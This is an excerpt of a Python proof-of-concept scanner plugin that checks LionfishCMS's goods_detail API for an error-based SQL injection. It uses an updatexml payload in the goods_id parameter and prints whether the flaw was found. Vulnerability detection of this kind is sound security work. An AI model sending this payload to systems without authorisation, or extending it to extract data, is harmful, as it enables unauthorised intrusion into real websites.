...
POC_NAME = "LionFish1"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class LionFish1(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0003',    # PoC的VID编号
            'vbid': '',
            'Name': 'LionfishCMS ApiController.class.php SQL Injection',    # PoC名称
            'Author': 'mumu',    # PoC作者
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)')
        headers = {
        ...
        if "syntax" in location:
            ...
            if verbose:
                highlight('[+] LionfishCMS ApiController.class.php SQL Injection found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] LionfishCMS ApiController.class.php SQL Injection not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
